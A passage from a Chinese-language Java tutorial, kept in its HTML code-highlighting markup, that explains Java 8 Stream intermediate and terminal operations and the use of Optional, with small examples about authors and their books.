class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        打印所有作家的姓名</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br><span class="hljs-comment">//        authors.stream()</span><br><span class="hljs-comment">//                .map(author -&gt; author.getName())</span><br><span class="hljs-comment">//                .forEach(s -&gt; System.out.println(s));</span><br><br>        authors.stream()<br>                .map(author -&gt; author.getAge())<br>                .map(age-&gt;age+<span class="hljs-number">10</span>)<br>                .forEach(age-&gt; System.out.println(age));<br></code></pre></td></tr></table></figure><h5 id="distinct"><a class="markdownIt-Anchor" href="#distinct"></a> distinct</h5><p>​可以去除流中的重复元素。</p><p>例如：</p><p>​打印所有作家的姓名，并且要求其中不能有重复元素。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .distinct()<br>        .forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><p><strong>注意：distinct方法是依赖Object的equals方法来判断是否是相同对象的。所以需要注意重写equals方法。</strong></p><h5 id="sorted"><a class="markdownIt-Anchor" href="#sorted"></a> sorted</h5><p>​可以对流中的元素进行排序。</p><p>例如：</p><p>​对流中的元素按照年龄进行降序排序，并且要求不能有重复的元素。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">        List&lt;Author&gt; authors = getAuthors();<br><span class="hljs-comment">//        对流中的元素按照年龄进行降序排序，并且要求不能有重复的元素。</span><br>        authors.stream()<br>                .distinct()<br>                .sorted()<br>                .forEach(author -&gt; System.out.println(author.getAge()));<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">        List&lt;Author&gt; authors = getAuthors();<br><span class="hljs-comment">//        对流中的元素按照年龄进行降序排序，并且要求不能有重复的元素。</span><br>        authors.stream()<br>                .distinct()<br>                .sorted((o1, o2) -&gt; o2.getAge()-o1.getAge())<br>                .forEach(author -&gt; System.out.println(author.getAge()));<br></code></pre></td></tr></table></figure><p><strong>注意：如果调用空参的sorted()方法，需要流中的元素是实现了Comparable。</strong></p><p>​</p><h5 id="limit"><a class="markdownIt-Anchor" href="#limit"></a> limit</h5><p>​可以设置流的最大长度，超出的部分将被抛弃。</p><p>例如：</p><p>​对流中的元素按照年龄进行降序排序，并且要求不能有重复的元素,然后打印其中年龄最大的两个作家的姓名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .distinct()<br>        .sorted()<br>        .limit(<span class="hljs-number">2</span>)<br>        .forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h5 id="skip"><a class="markdownIt-Anchor" href="#skip"></a> skip</h5><p>​跳过流中的前n个元素，返回剩下的元素</p><p>例如：</p><p>​打印除了年龄最大的作家外的其他作家，要求不能有重复元素，并且按照年龄降序排序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        打印除了年龄最大的作家外的其他作家，要求不能有重复元素，并且按照年龄降序排序。</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        authors.stream()<br>                .distinct()<br>                .sorted()<br>                .skip(<span class="hljs-number">1</span>)<br>                .forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h5 id="flatmap"><a class="markdownIt-Anchor" href="#flatmap"></a> flatMap</h5><p>​map只能把一个对象转换成另一个对象来作为流中的元素。而flatMap可以把一个对象转换成多个对象作为流中的元素。</p><p>例一：</p><p>​打印所有书籍的名字。要求对重复的元素进行去重。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        打印所有书籍的名字。要求对重复的元素进行去重。</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .distinct()<br>                .forEach(book -&gt; System.out.println(book.getName()));<br></code></pre></td></tr></table></figure><p>例二：</p><p>​打印现有数据的所有分类。要求对分类进行去重。不能出现这种格式：哲学,爱情</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        打印现有数据的所有分类。要求对分类进行去重。不能出现这种格式：哲学,爱情     爱情</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .distinct()<br>                .flatMap(book -&gt; Arrays.stream(book.getCategory().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>                .distinct()<br>                .forEach(category-&gt; System.out.println(category));<br></code></pre></td></tr></table></figure><h4 id="343-终结操作"><a class="markdownIt-Anchor" href="#343-终结操作"></a> 3.4.3 终结操作</h4><h5 id="foreach"><a class="markdownIt-Anchor" href="#foreach"></a> forEach</h5><p>​对流中的元素进行遍历操作，我们通过传入的参数去指定对遍历到的元素进行什么具体操作。</p><p>例子：</p><p>​输出所有作家的名字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        输出所有作家的名字</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        authors.stream()<br>                .map(author -&gt; author.getName())<br>                .distinct()<br>                .forEach(name-&gt; System.out.println(name));<br><br></code></pre></td></tr></table></figure><h5 id="count"><a class="markdownIt-Anchor" href="#count"></a> count</h5><p>​可以用来获取当前流中元素的个数。</p><p>例子：</p><p>​打印这些作家的所出书籍的数目，注意删除重复元素。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        打印这些作家的所出书籍的数目，注意删除重复元素。</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        <span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .distinct()<br>                .count();<br>        System.out.println(count);<br></code></pre></td></tr></table></figure><h5 id="maxmin"><a class="markdownIt-Anchor" href="#maxmin"></a> max&amp;min</h5><p>​可以用来或者流中的最值。</p><p>例子：</p><p>​分别获取这些作家的所出书籍的最高分和最低分并打印。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        分别获取这些作家的所出书籍的最高分和最低分并打印。</span><br>        <span class="hljs-comment">//Stream&lt;Author&gt;  -&gt; Stream&lt;Book&gt; -&gt;Stream&lt;Integer&gt;  -&gt;求值</span><br><br>        List&lt;Author&gt; authors = getAuthors();<br>        Optional&lt;Integer&gt; max = authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .map(book -&gt; book.getScore())<br>                .max((score1, score2) -&gt; score1 - score2);<br><br>        Optional&lt;Integer&gt; min = authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .map(book -&gt; book.getScore())<br>                .min((score1, score2) -&gt; score1 - score2);<br>        System.out.println(max.get());<br>        System.out.println(min.get());<br></code></pre></td></tr></table></figure><p>例子：</p><p>​数组获取最值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Test_4</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span>[] ints = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; ints.length; i++) &#123;<br>                ints[i] = i;<br>        &#125;<br>        System.out.println(Arrays.stream(ints).max().getAsInt());<br>        System.out.println(Arrays.stream(ints).min().getAsInt());<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意</p></blockquote><p>基本类型与它的吧包装类型可以调用空参的<code>max&amp;min()</code>方法。</p><p>其他的不行。实现了 <strong>Comparable</strong>  <strong>Comparator</strong>还是一样</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221221144815244.png" alt="image-20221221144815244" /></p><h5 id="collect"><a class="markdownIt-Anchor" href="#collect"></a> collect</h5><p>​把当前流转换成一个集合。</p><p>例子：</p><p>​获取一个存放所有作者名字的List集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        获取一个存放所有作者名字的List集合。</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        List&lt;String&gt; nameList = authors.stream()<br>                .map(author -&gt; author.getName())<br>                .collect(Collectors.toList());<br>        System.out.println(nameList);<br></code></pre></td></tr></table></figure><p>​获取一个所有书名的Set集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        获取一个所有书名的Set集合。</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        Set&lt;Book&gt; books = authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .collect(Collectors.toSet());<br><br>        System.out.println(books);<br></code></pre></td></tr></table></figure><p>​获取一个Map集合，map的key为作者名，value为List<Book></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        获取一个Map集合，map的key为作者名，value为List&lt;Book&gt;</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        Map&lt;String, List&lt;Book&gt;&gt; map = authors.stream()<br>                .distinct()<br>                .collect(Collectors.toMap(author -&gt; author.getName(), author -&gt; author.getBooks()));<br><br>        System.out.println(map);<br></code></pre></td></tr></table></figure><h5 id="查找与匹配"><a class="markdownIt-Anchor" href="#查找与匹配"></a> 查找与匹配</h5><h6 id="anymatch"><a class="markdownIt-Anchor" href="#anymatch"></a> anyMatch</h6><p>​可以用来判断是否有任意符合匹配条件的元素，结果为boolean类型。</p><p>例子：</p><p>​判断是否有年龄在29以上的作家</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        判断是否有年龄在29以上的作家</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> authors.stream()<br>                .anyMatch(author -&gt; author.getAge() &gt; <span class="hljs-number">29</span>);<br>        System.out.println(flag);<br></code></pre></td></tr></table></figure><h6 id="allmatch"><a class="markdownIt-Anchor" href="#allmatch"></a> allMatch</h6><p>​可以用来判断是否都符合匹配条件，结果为boolean类型。如果都符合结果为true，否则结果为false。</p><p>例子：</p><p>​判断是否所有的作家都是成年人</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        判断是否所有的作家都是成年人</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> authors.stream()<br>                .allMatch(author -&gt; author.getAge() &gt;= <span class="hljs-number">18</span>);<br>        System.out.println(flag);<br></code></pre></td></tr></table></figure><h6 id="nonematch"><a class="markdownIt-Anchor" href="#nonematch"></a> noneMatch</h6><p>​可以判断流中的元素是否都不符合匹配条件。如果都不符合结果为true，否则结果为false</p><p>例子：</p><p>​判断作家是否都没有超过100岁的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        判断作家是否都没有超过100岁的。</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> authors.stream()<br>                .noneMatch(author -&gt; author.getAge() &gt; <span class="hljs-number">100</span>);<br><br>        System.out.println(b);<br></code></pre></td></tr></table></figure><h6 id="findany"><a class="markdownIt-Anchor" href="#findany"></a> findAny</h6><p>​获取流中的任意一个元素。该方法没有办法保证获取的一定是流中的第一个元素。</p><p>例子：</p><p>​获取任意一个年龄大于13的作家，如果存在就输出他的名字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        获取任意一个年龄大于13的作家，如果存在就输出他的名字</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        Optional&lt;Author&gt; optionalAuthor = authors.stream()<br>                .filter(author -&gt; author.getAge()&gt;<span class="hljs-number">13</span>)<br>                .findAny();<br><br>        optionalAuthor.ifPresent(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h6 id="findfirst"><a class="markdownIt-Anchor" href="#findfirst"></a> findFirst</h6><p>​获取流中的第一个元素。</p><p>例子：</p><p>​获取一个年龄最小的作家，并输出他的姓名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        获取一个年龄最小的作家，并输出他的姓名。</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        Optional&lt;Author&gt; first = authors.stream()<br>                .sorted((o1, o2) -&gt; o1.getAge() - o2.getAge())<br>                .findFirst();<br><br>        first.ifPresent(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><p>DeBug代码发现，steam流会受到后面操作的影响。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Test_6</span><span class="hljs-params">()</span> &#123;<br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">14</span>)<br>            .forEach(author -&gt; System.out.println(author));<br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">14</span>)<br>            .findAny()<br>            .ifPresent(author -&gt; System.out.println(author.getName()));<br><br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">14</span>)<br>            .findFirst()<br>            .ifPresent(author -&gt; System.out.println(author.getName()));<br><br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">15</span>)<br>            .findAny()<br>            .ifPresent(author -&gt; System.out.println(author.getName()));<br><br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">15</span>)<br>            .findFirst()<br>            .ifPresent(author -&gt; System.out.println(author.getName()));<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221221154049113.png" alt="image-20221221154049113" /></p><p>我的猜想：</p><ol><li><p>因为该流是有顺序的串行流，按照最优执行会按照顺序。</p></li><li><p><code>findFirst()</code>需要获取流的第一个。一个元素通过<strong>filter</strong>，则有个元素进入到<strong>findFirst</strong>。在<strong>findFirst</strong>之前的对流的操作直接停止。</p></li><li><p><code>findAny（）</code> 获取流中的任意一个元素。在串行流中，为了保证性能也基本是第一个。就和<code>findFirst()</code>一样。</p></li><li><p>它们都是终结操作，流被终结了。</p></li></ol><h5 id="reduce归并"><a class="markdownIt-Anchor" href="#reduce归并"></a> reduce归并</h5><p>​对流中的数据按照你指定的计算方式计算出一个结果。（缩减操作）</p><p>​reduce的作用是把stream中的元素给组合起来，我们可以传入一个初始值，它会按照我们的计算方式依次拿流中的元素和初始化值进行计算，计算结果再和后面的元素计算。</p><p>​reduce两个参数的重载形式内部的计算方式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> identity;<br><span class="hljs-keyword">for</span> (T element : <span class="hljs-built_in">this</span> stream)<br>result = accumulator.apply(result, element)<br><span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure><p>​其中identity就是我们可以通过方法参数传入的初始值，accumulator的apply具体进行什么计算也是我们通过方法参数来确定的。</p><p>例子：</p><p>​使用reduce求所有作者年龄的和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        使用reduce求所有作者年龄的和</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> authors.stream()<br>                .distinct()<br>                .map(author -&gt; author.getAge())<br>                .reduce(<span class="hljs-number">0</span>, (result, element) -&gt; result + element);<br>        System.out.println(sum);<br></code></pre></td></tr></table></figure><p>​使用reduce求所有作者中年龄的最大值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        使用reduce求所有作者中年龄的最大值</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> authors.stream()<br>                .map(author -&gt; author.getAge())<br>                .reduce(Integer.MIN_VALUE, (result, element) -&gt; result &lt; element ? element : result);<br><br>        System.out.println(max);<br></code></pre></td></tr></table></figure><p>​使用reduce求所有作者中年龄的最小值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        使用reduce求所有作者中年龄的最小值</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">min</span> <span class="hljs-operator">=</span> authors.stream()<br>                .map(author -&gt; author.getAge())<br>                .reduce(Integer.MAX_VALUE, (result, element) -&gt; result &gt; element ? element : result);<br>        System.out.println(min);<br></code></pre></td></tr></table></figure><p>​reduce一个参数的重载形式内部的计算</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-variable">foundAny</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>  <span class="hljs-keyword">for</span> (T element : <span class="hljs-built_in">this</span> stream) &#123;<br>      <span class="hljs-keyword">if</span> (!foundAny) &#123;<br>          foundAny = <span class="hljs-literal">true</span>;<br>          result = element;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>          result = accumulator.apply(result, element);<br>  &#125;<br>  <span class="hljs-keyword">return</span> foundAny ? Optional.of(result) : Optional.empty();<br></code></pre></td></tr></table></figure><p>​如果用一个参数的重载方法去求最小值代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        使用reduce求所有作者中年龄的最小值</span><br>List&lt;Author&gt; authors = getAuthors();<br>Optional&lt;Integer&gt; minOptional = authors.stream()<br>        .map(author -&gt; author.getAge())<br>        .reduce((result, element) -&gt; result &gt; element ? element : result);<br>minOptional.ifPresent(age-&gt; System.out.println(age));<br></code></pre></td></tr></table></figure><h3 id="35-注意事项"><a class="markdownIt-Anchor" href="#35-注意事项"></a> 3.5 注意事项</h3><ul><li>惰性求值（如果没有终结操作，没有中间操作是不会得到执行的）</li><li>流是一次性的（一旦一个流对象经过一个终结操作后。这个流就不能再被使用）</li><li>不会影响原数据（我们在流中可以多数据做很多处理。但是正常情况下是不会影响原来集合中的元素的。这往往也是我们期望的）</li></ul><h2 id="4-optional"><a class="markdownIt-Anchor" href="#4-optional"></a> 4. Optional</h2><h3 id="41-概述"><a class="markdownIt-Anchor" href="#41-概述"></a> 4.1 概述</h3><p>​我们在编写代码的时候出现最多的就是空指针异常。所以在很多情况下我们需要做各种非空的判断。</p><p>​例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> getAuthor();<br><span class="hljs-keyword">if</span>(author!=<span class="hljs-literal">null</span>)&#123;<br>    System.out.println(author.getName());<br>&#125;<br></code></pre></td></tr></table></figure><p>​尤其是对象中的属性还是一个对象的情况下。这种判断会更多。</p><p>​而过多的判断语句会让我们的代码显得臃肿不堪。</p><p>​所以在JDK8中引入了Optional,养成使用Optional的习惯后你可以写出更优雅的代码来避免空指针异常。</p><p>​并且在很多函数式编程相关的API中也都用到了Optional，如果不会使用Optional也会对函数式编程的学习造成影响。</p><h3 id="42-使用"><a class="markdownIt-Anchor" href="#42-使用"></a> 4.2 使用</h3><h4 id="421-创建对象"><a class="markdownIt-Anchor" href="#421-创建对象"></a> 4.2.1 创建对象</h4><p>​Optional就好像是包装类，可以把我们的具体数据封装Optional对象内部。然后我们去使用Optional中封装好的方法操作封装进去的数据就可以非常优雅的避免空指针异常。</p><p>​我们一般使用<strong>Optional</strong>的<strong>静态方法ofNullable</strong>来把数据封装成一个Optional对象。无论传入的参数是否为null都不会出现问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> getAuthor();<br>Optional&lt;Author&gt; authorOptional = Optional.ofNullable(author);<br></code></pre></td></tr></table></figure><p>​你可能会觉得还要加一行代码来封装数据比较麻烦。但是如果改造下getAuthor方法，让其的返回值就是封装好的Optional的话，我们在使用时就会方便很多。</p><p>​而且在实际开发中我们的数据很多是从数据库获取的。Mybatis从3.5版本可以也已经支持Optional了。我们可以直接把dao方法的返回值类型定义成Optional类型，MyBastis会自己把数据封装成Optional对象返回。封装的过程也不需要我们自己操作。</p><p>​如果你<strong>确定一个对象不是空</strong>的则可以使用<strong>Optional</strong>的<strong>静态方法of</strong>来把数据封装成Optional对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>();<br>Optional&lt;Author&gt; authorOptional = Optional.of(author);<br></code></pre></td></tr></table></figure><p>​但是一定要注意，如果使用of的时候传入的参数必须不为null。（尝试下传入null会出现什么结果）</p><p><code>NullPointerException</code></p><p>​如果一个方法的返回值类型是Optional类型。而如果我们经判断发现某次计算得到的返回值为null，这个时候就需要把null封装成Optional对象返回。这时则可以使用<strong>Optional</strong>的<strong>静态方法empty</strong>来进行封装。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional.empty()<br></code></pre></td></tr></table></figure><p>​</p><p>​所以最后你觉得哪种方式会更方便呢？<strong>ofNullable</strong></p><h4 id="422-安全消费值"><a class="markdownIt-Anchor" href="#422-安全消费值"></a> 4.2.2 安全消费值</h4><p>​我们获取到一个Optional对象后肯定需要对其中的数据进行使用。这时候我们可以使用其<strong>ifPresent</strong>方法对来消费其中的值。</p><p>​这个方法会判断其内封装的数据是否为空，不为空时才会执行具体的消费代码。这样使用起来就更加安全了。</p><p>​例如,以下写法就优雅的避免了空指针异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br><br>authorOptional.ifPresent(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h4 id="423-获取值"><a class="markdownIt-Anchor" href="#423-获取值"></a> 4.2.3 获取值</h4><p>​如果我们想获取值自己进行处理可以使用get方法获取，但是不推荐。因为当Optional内部的数据为空的时候会出现异常。</p><h4 id="424-安全获取值"><a class="markdownIt-Anchor" href="#424-安全获取值"></a> 4.2.4 安全获取值</h4><p>​如果我们期望安全的获取值。我们不推荐使用get方法，而是使用Optional提供的以下方法。</p><ul><li><p>orElseGet</p><p>获取数据并且设置数据为空时的默认值。如果数据不为空就能获取到该数据。如果为空则根据你传入的参数来创建对象作为默认值返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br><span class="hljs-type">Author</span> <span class="hljs-variable">author1</span> <span class="hljs-operator">=</span> authorOptional.orElseGet(() -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title 